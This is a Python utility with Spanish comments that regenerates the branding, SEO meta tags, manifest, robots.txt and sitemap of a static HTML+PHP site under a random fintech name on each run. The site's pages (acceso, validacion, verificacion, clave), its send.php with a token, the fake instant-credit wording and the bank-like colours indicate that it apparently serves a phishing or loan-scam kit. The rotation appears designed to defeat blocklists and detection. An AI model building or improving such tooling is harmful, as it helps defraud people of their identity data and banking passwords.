"""
randomize.py
============
Aleatoriza todas las etiquetas SEO/branding/CTA de un proyecto estático
HTML+PHP sin romper su funcionamiento.

USO:
    python randomize.py                     # randomiza todo
    python randomize.py --domain mi.com     # fija un dominio canónico
    python randomize.py --restore           # restaura el último backup
    python randomize.py --seed 1234         # reproducible para pruebas

QUÉ HACE EN CADA EJECUCIÓN:
  1. Genera una "marca" aleatoria (nombre, descripciones, keywords).
  2. Sustituye o inserta:
        <title>, meta description, meta keywords
        og:title / og:description / og:image / og:url
        twitter:title / twitter:description / twitter:image
        canonical, theme-color, apple-mobile-web-app-title
        application-name, JSON-LD structured data
  3. Reemplaza textos CTA conocidos (Continuar, Entrar, etc.) por sinónimos.
  4. Reemplaza H1/H2 de la landing por variantes equivalentes.
  5. Reemplaza textos del footer.
  6. Añade ?v=<hash> a referencias de styles.css, acceso.css y *.js para
     versionado/cache busting.
  7. Reemplaza alt de las imágenes con variantes random.
  8. Genera/regenera: manifest.json, robots.txt, sitemap.xml, favicon link.
  9. Cambia <html data-build="...">  con un identificador único.

NO TOCA:
  - Nombres de archivos, IDs ni classes (rompería CSS/JS).
  - Lógica de send.php / config.php (token).
  - Estructura del DOM.

Crea un backup ZIP en .randomize_backups/ antes de modificar.
"""

from __future__ import annotations
import argparse
import datetime as dt
import hashlib
import json
import random
import re
import shutil
import string
import sys
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
HTML_FILES = ['index.html', 'acceso.html', 'validacion.html', 'verificacion.html', 'clave.html']
ASSET_FILES = ['styles.css', 'acceso.css', 'script.js', 'acceso.js', 'validacion.js', 'verificacion.js', 'clave.js', 'protect.js']

# ---------------------------------------------------------------------------
# VOCABULARIO
# ---------------------------------------------------------------------------
BRAND_PREFIX = ['Pago', 'Vali', 'Credi', 'Solu', 'Conex', 'Finsa', 'Capi', 'Banca',
                'Mone', 'Fintec', 'Activa', 'Nube', 'Agil', 'Direc', 'Linea', 'Pro',
                'Cova', 'Andi', 'Latam', 'Veri', 'Sigma', 'Onda', 'Tribu', 'Quanta']
BRAND_SUFFIX = ['Pay', 'Net', 'Hub', 'Plus', 'Soluciones', 'Digital', 'Ya',
                'Express', 'Group', 'App', 'Linea', 'Cred', 'Bank', 'Pro',
                'Cash', 'Click', 'Fin', 'Money', 'Lab', 'Stack', 'X', 'One']

TITLE_TPLS = [
    'Simulador de Crédito | {brand}',
    'Tu crédito digital con {brand}',
    '{brand} - Validación financiera segura',
    'Activa tu crédito con {brand}',
    'Solicita tu crédito en línea | {brand}',
    '{brand} | Crédito al instante',
    'Validación crediticia rápida | {brand}',
]

DESC_TPLS = [
    'Plataforma de validación crediticia 100% digital. Procesos rápidos, seguros y sin papeleo con {brand}.',
    'Solicita tu crédito en línea con {brand} y recibe respuesta en minutos. Sin filas ni complicaciones.',
    'Crédito digital aprobado al instante. {brand} te acompaña en cada paso de forma segura.',
    'Obtén la financiación que necesitas con {brand}. Trámite 100% digital y respuesta inmediata.',
    'Validación segura y confidencial para tu crédito personal en línea. Confianza con {brand}.',
]

KEYWORDS = ['crédito en línea', 'préstamo digital', 'financiación rápida', 'simulador de crédito',
            'fintech colombia', 'banco digital', 'tarjeta de crédito', 'aprobación inmediata',
            'crédito personal', 'solicitud online', 'cupo aprobado', 'validación de identidad',
            'centrales de riesgo', 'desembolso rápido']

# Encabezados (variantes equivalentes que mantienen sentido)
HERO_H1 = [
    'Evaluación de Perfil Financiero',
    'Tu Perfil Crediticio Digital',
    'Simulación Inteligente de Crédito',
    'Validación de Crédito Personalizada',
    'Análisis Financiero en Minutos',
    'Solicita tu Crédito en Línea',
]

H2_VARIANTS = {
    'Información Personal': ['Información Personal', 'Datos Personales', 'Tus Datos', 'Información Básica', 'Datos del Solicitante'],
    'Información de Identificación': ['Información de Identificación', 'Datos de Identificación', 'Documento de Identidad', 'Tu Identidad'],
    'Resultados de Simulación': ['Resultados de Simulación', 'Resultados de tu Análisis', 'Tu Resultado', 'Análisis Completado', 'Tu Perfil Aprobado'],
    'Resumen de tu Perfil': ['Resumen de tu Perfil', 'Tu Perfil Resumido', 'Perfil del Solicitante', 'Información del Perfil'],
    'Verificando tu información': ['Verificando tu información', 'Procesando tu solicitud', 'Validando tus datos', 'Analizando tu perfil'],
}

# Textos CTA conocidos en el proyecto
CTA_VARIANTS = {
    'Continuar': ['Continuar', 'Siguiente', 'Avanzar', 'Seguir'],
    'Volver': ['Volver', 'Atrás', 'Regresar'],
    'Solicitar Ahora': ['Solicitar Ahora', 'Activar Crédito', 'Solicitar Crédito', 'Continuar Solicitud'],
    'Entrar': ['Entrar', 'Ingresar', 'Acceder', 'Iniciar Sesión'],
    'Validar identidad': ['Validar identidad', 'Verificar identidad', 'Confirmar identidad'],
    'Recibir Crédito': ['Recibir Crédito', 'Confirmar Crédito', 'Activar Crédito', 'Recibir Desembolso'],
    'Confirmar': ['Confirmar', 'Enviar', 'Validar', 'Procesar'],
    'Iniciar Sesión': ['Iniciar Sesión', 'Ingresar', 'Entrar', 'Acceder'],
    'Nueva simulación': ['Nueva simulación', 'Nueva consulta', 'Empezar de nuevo', 'Volver al inicio'],
}

ALT_VARIANTS = {
    'Logo': ['Logo', 'Marca', 'Identidad', 'Logotipo'],
    'Tarjeta CeroRollo': ['Tarjeta de crédito', 'Producto financiero', 'Tarjeta digital', 'Tarjeta aprobada'],
}

FOOTER_VARIANTS = [
    '© {year} Validación Crediticia. Todos los derechos reservados.',
    '© {year} {brand}. Todos los derechos reservados.',
    '© {year} {brand} - Plataforma de servicios financieros.',
    '© {year} {brand}. Aliado financiero confiable.',
]

# ---------------------------------------------------------------------------
# UTILIDADES
# ---------------------------------------------------------------------------
def make_brand() -> str:
    return random.choice(BRAND_PREFIX) + random.choice(BRAND_SUFFIX)

def random_hash(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def backup() -> Path:
    bdir = ROOT / '.randomize_backups'
    bdir.mkdir(exist_ok=True)
    name = bdir / f"backup_{dt.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    targets = HTML_FILES + ASSET_FILES + ['manifest.json', 'robots.txt', 'sitemap.xml']
    with zipfile.ZipFile(name, 'w', zipfile.ZIP_DEFLATED) as z:
        for f in targets:
            p = ROOT / f
            if p.exists():
                z.write(p, arcname=f)
    return name

def restore_last_backup() -> bool:
    bdir = ROOT / '.randomize_backups'
    if not bdir.exists():
        return False
    backups = sorted(bdir.glob('backup_*.zip'))
    if not backups:
        return False
    last = backups[-1]
    with zipfile.ZipFile(last, 'r') as z:
        z.extractall(ROOT)
    print(f"Restaurado desde {last.name}")
    return True

def read(p: Path) -> str:
    return p.read_text(encoding='utf-8') if p.exists() else ''

def write(p: Path, content: str) -> None:
    """Escritura atómica: escribe a un .tmp y hace rename.
    En el mismo filesystem, rename es atómico, así un usuario que esté
    descargando el archivo nunca verá un estado intermedio."""
    tmp = p.with_suffix(p.suffix + '.tmp')
    tmp.write_text(content, encoding='utf-8')
    tmp.replace(p)

# ---------------------------------------------------------------------------
# OPERACIONES SOBRE HTML
# ---------------------------------------------------------------------------
def upsert_meta_in_head(html: str, meta_html: str) -> str:
    """Inserta un bloque de meta dentro del <head>, después de la última etiqueta meta existente."""
    if '<head>' not in html:
        return html
    # Marca un comentario único para que en próximas pasadas reemplacemos en bloque
    marker_open = '<!-- nq:meta:start -->'
    marker_close = '<!-- nq:meta:end -->'
    block = f"{marker_open}\n{meta_html}\n{marker_close}"
    if marker_open in html and marker_close in html:
        html = re.sub(
            re.escape(marker_open) + r'.*?' + re.escape(marker_close),
            block,
            html,
            count=1,
            flags=re.DOTALL,
        )
    else:
        html = html.replace('</head>', f"  {block}\n</head>", 1)
    return html

def replace_title(html: str, title: str) -> str:
    if re.search(r'<title>.*?</title>', html, flags=re.DOTALL):
        return re.sub(r'<title>.*?</title>', f'<title>{title}</title>', html, count=1, flags=re.DOTALL)
    return html.replace('</head>', f'  <title>{title}</title>\n</head>', 1)

def replace_first(html: str, pattern: str, repl: str) -> str:
    return re.sub(pattern, repl, html, count=1, flags=re.DOTALL)

def replace_text_pool(html: str, original: str, options: list[str]) -> str:
    """Reemplaza ocurrencias literales del texto por una variante aleatoria."""
    if original not in html:
        return html
    choice = random.choice(options)
    return html.replace(original, choice)

def add_version_to_assets(html: str, version: str) -> str:
    # styles.css, acceso.css, *.js -> añadir/actualizar ?v=
    def repl(m):
        attr_name = m.group(1)  # href o src
        url = m.group(2)
        # Quitar versión existente
        clean = re.sub(r'\?v=[a-z0-9]+', '', url)
        sep = '&' if '?' in clean else '?'
        return f'{attr_name}="{clean}{sep}v={version}"'
    return re.sub(r'(href|src)="([^"]+\.(?:css|js))(?:\?v=[a-z0-9]+)?"', repl, html)

def replace_alts(html: str) -> str:
    def repl(m):
        original = m.group(1)
        for key, opts in ALT_VARIANTS.items():
            if key.lower() in original.lower():
                return f'alt="{random.choice(opts)}"'
        return m.group(0)
    return re.sub(r'alt="([^"]+)"', repl, html)

def replace_h1(html: str) -> str:
    return re.sub(
        r'(<h1[^>]*class="hero-title"[^>]*>)(.*?)(</h1>)',
        lambda m: m.group(1) + random.choice(HERO_H1) + m.group(3),
        html,
        count=1,
        flags=re.DOTALL,
    )

def replace_h2_known(html: str) -> str:
    for original, opts in H2_VARIANTS.items():
        new = random.choice(opts)
        # Solo reemplaza el texto entre los tags, conservando atributos
        html = re.sub(
            r'(<h2[^>]*>\s*)' + re.escape(original) + r'(\s*</h2>)',
            lambda m, n=new: m.group(1) + n + m.group(2),
            html,
            flags=re.DOTALL,
        )
        # También para card-title h2
        html = re.sub(
            r'(<h2[^>]*class="card-title"[^>]*>\s*)' + re.escape(original) + r'(\s*</h2>)',
            lambda m, n=new: m.group(1) + n + m.group(2),
            html,
            flags=re.DOTALL,
        )
    return html

def replace_ctas(html: str) -> str:
    for original, opts in CTA_VARIANTS.items():
        choice = random.choice(opts)
        # Reemplazar dentro de botones y enlaces (texto plano entre tags)
        # Usamos un patrón seguro buscando el texto literal con espacios.
        pattern = re.compile(r'(>\s*)' + re.escape(original) + r'(\s*<)')
        html = pattern.sub(lambda m, c=choice: m.group(1) + c + m.group(2), html)
    return html

def replace_footer(html: str, brand: str) -> str:
    year = dt.datetime.now().year
    new_text = random.choice(FOOTER_VARIANTS).format(year=year, brand=brand)
    return re.sub(
        r'(<p[^>]*class="footer-copy"[^>]*>)(.*?)(</p>)',
        lambda m: m.group(1) + new_text + m.group(3),
        html,
        flags=re.DOTALL,
    )

def set_html_data_build(html: str, build_id: str) -> str:
    if re.search(r'<html[^>]*data-build="[^"]*"', html):
        return re.sub(r'(<html[^>]*?)\s*data-build="[^"]*"', r'\1', html, count=1)
    return re.sub(r'<html\b', f'<html data-build="{build_id}"', html, count=1)

# ---------------------------------------------------------------------------
# ARCHIVOS AUXILIARES
# ---------------------------------------------------------------------------
def write_manifest(brand: str, theme_color: str) -> None:
    data = {
        "name": brand,
        "short_name": brand[:12],
        "description": random.choice(DESC_TPLS).format(brand=brand),
        "start_url": "/",
        "display": "standalone",
        "background_color": "#ffffff",
        "theme_color": theme_color,
        "icons": [
            {"src": "img/logo.svg", "sizes": "any", "type": "image/svg+xml"},
        ],
        "id": "/?v=" + random_hash(6),
    }
    write(ROOT / 'manifest.json', json.dumps(data, ensure_ascii=False, indent=2))

def write_robots(domain: str) -> None:
    content = (
        "User-agent: *\n"
        "Disallow: /config.php\n"
        "Disallow: /send.php\n"
        "Disallow: /pack.php\n"
        "Disallow: /.randomize_backups/\n"
        f"Sitemap: https://{domain}/sitemap.xml\n"
    )
    write(ROOT / 'robots.txt', content)

def write_sitemap(domain: str) -> None:
    today = dt.date.today().isoformat()
    urls = ''.join(
        f'  <url><loc>https://{domain}/{f}</loc><lastmod>{today}</lastmod></url>\n'
        for f in HTML_FILES
    )
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        f'{urls}'
        '</urlset>\n'
    )
    write(ROOT / 'sitemap.xml', xml)

# ---------------------------------------------------------------------------
# CONSTRUCCIÓN DEL BLOQUE META
# ---------------------------------------------------------------------------
def build_meta_block(brand: str, title: str, desc: str, kw: list[str], domain: str, page: str, theme: str) -> str:
    og_image = f'https://{domain}/img/og-{random_hash(6)}.jpg'
    canonical = f'https://{domain}/{page}'
    ld = {
        "@context": "https://schema.org",
        "@type": "FinancialProduct",
        "name": brand,
        "description": desc,
        "url": canonical,
        "provider": {"@type": "Organization", "name": brand, "url": f'https://{domain}/'},
    }
    parts = [
        f'<meta name="description" content="{desc}" />',
        f'<meta name="keywords" content="{", ".join(kw)}" />',
        f'<meta name="author" content="{brand}" />',
        f'<meta name="application-name" content="{brand}" />',
        f'<meta name="apple-mobile-web-app-title" content="{brand}" />',
        f'<meta name="theme-color" content="{theme}" />',
        f'<meta name="robots" content="index,follow" />',
        f'<link rel="canonical" href="{canonical}" />',
        f'<link rel="manifest" href="manifest.json" />',
        f'<link rel="icon" href="img/logo.svg" type="image/svg+xml" />',
        f'<meta property="og:type" content="website" />',
        f'<meta property="og:title" content="{title}" />',
        f'<meta property="og:description" content="{desc}" />',
        f'<meta property="og:image" content="{og_image}" />',
        f'<meta property="og:url" content="{canonical}" />',
        f'<meta property="og:site_name" content="{brand}" />',
        f'<meta name="twitter:card" content="summary_large_image" />',
        f'<meta name="twitter:title" content="{title}" />',
        f'<meta name="twitter:description" content="{desc}" />',
        f'<meta name="twitter:image" content="{og_image}" />',
        f'<script type="application/ld+json">{json.dumps(ld, ensure_ascii=False)}</script>',
    ]
    return '\n  '.join(parts)

# ---------------------------------------------------------------------------
# PROCESO PRINCIPAL
# ---------------------------------------------------------------------------
def process(domain: str) -> None:
    backup_path = backup()
    print(f"[backup] {backup_path.name}")

    brand = make_brand()
    theme = random.choice(['#5b1aa8', '#da0081', '#4a0f3a', '#1d8c44', '#2a0a22', '#003893'])
    version = random_hash(8)
    build_id = random_hash(12)
    print(f"[brand]   {brand}")
    print(f"[theme]   {theme}")
    print(f"[version] {version}")

    desc_template = random.choice(DESC_TPLS)
    keywords_pick = random.sample(KEYWORDS, k=min(8, len(KEYWORDS)))

    for fname in HTML_FILES:
        p = ROOT / fname
        if not p.exists():
            continue
        html = read(p)

        title = random.choice(TITLE_TPLS).format(brand=brand)
        desc = desc_template.format(brand=brand)

        meta_block = build_meta_block(brand, title, desc, keywords_pick, domain, fname, theme)

        html = replace_title(html, title)
        html = upsert_meta_in_head(html, meta_block)
        # Cambios visibles desactivados (H1, H2, CTAs, alt, footer) - solo SEO/meta.
        html = add_version_to_assets(html, version)
        html = set_html_data_build(html, build_id)

        write(p, html)
        print(f"[html]    {fname}")

    write_manifest(brand, theme)
    write_robots(domain)
    write_sitemap(domain)
    print('[file]    manifest.json, robots.txt, sitemap.xml')

    print('\nListo. Marca:', brand)

# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> int:
    parser = argparse.ArgumentParser(description='Aleatoriza SEO/branding/CTA del proyecto.')
    parser.add_argument('--domain', default='ejemplo.com', help='Dominio canónico (sin https://).')
    parser.add_argument('--seed', type=int, help='Semilla para reproducibilidad.')
    parser.add_argument('--restore', action='store_true', help='Restaura el último backup.')
    args = parser.parse_args()

    if args.restore:
        ok = restore_last_backup()
        return 0 if ok else 1

    if args.seed is not None:
        random.seed(args.seed)
    process(args.domain)
    return 0

if __name__ == '__main__':
    sys.exit(main())
